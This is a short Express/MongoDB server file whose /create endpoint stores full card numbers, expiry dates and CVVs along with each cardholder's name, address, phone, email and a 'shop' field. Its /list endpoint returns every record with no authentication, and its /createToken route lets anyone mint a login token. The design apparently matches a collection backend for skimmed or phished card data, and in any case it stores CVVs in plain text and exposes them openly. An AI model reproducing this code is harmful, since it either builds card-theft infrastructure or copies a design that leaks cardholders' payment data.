const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const jwt = require("jsonwebtoken");

const entrySchema = require("./models/entrySchema");
const profileSchema = require("./models/profileSchema");

require("dotenv").config();

const app = express();
app.use(express.json());
app.use(cors());

mongoose.connect(process.env.MONGO_URI, () => {
  console.log("DB CONNECTED");
});

app.get("/", (_, res) => {
  res.status(200).json({ message: "hello" });
});

app.get("/list", async (_, res) => {
  try {
    const everythingFound = await entrySchema.find({});
    res.status(200).send(everythingFound);
  } catch (error) {
    res.status(501).send(error);
  }
});

app.post("/create", async (req, res) => {
  const reg = new entrySchema({
    shop: req.body.shop,
    type: req.body.type,
    name: req.body.name,
    country: req.body.country,
    city: req.body.city,
    state: req.body.state,
    zip: req.body.zip,
    address: req.body.address,
    phone: req.body.phone,
    email: req.body.email,
    cardNumber: req.body.cardNumber,
    cardExpiry: req.body.cardExpiry,
    cardCVV: req.body.cardCVV,
  });
  try {
    const savedEntry = await reg.save();
    res.status(201).json(savedEntry);
  } catch (error) {
    res.status(501).json(error);
  }
});

app.post("/login", (req, res) => {
  profileSchema.findOne({ token: req.body.token }).exec((err, token) => {
    err ? res.status(500).json(err) : 0;
    !token
      ? res.status(400).json({})
      : (() => {
          const accessToken = jwt.sign(
            { profile_id: token._id, profileToken: token.token },
            process.env.TOKEN_KEY,
            {
              expiresIn: "2h",
            }
          );
          res.status(201).json({ token: token.token, accessToken });
        })();
  });
});

app.post("/createToken", async (req, res) => {
  const reg = new profileSchema({
    token: req.body.token,
  });
  try {
    const savedEntry = await reg.save();
    res.status(201).json(savedEntry);
  } catch (error) {
    res.status(501).json(error);
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log(`STARTED AT ${process.env.PORT || 3000}`);
});
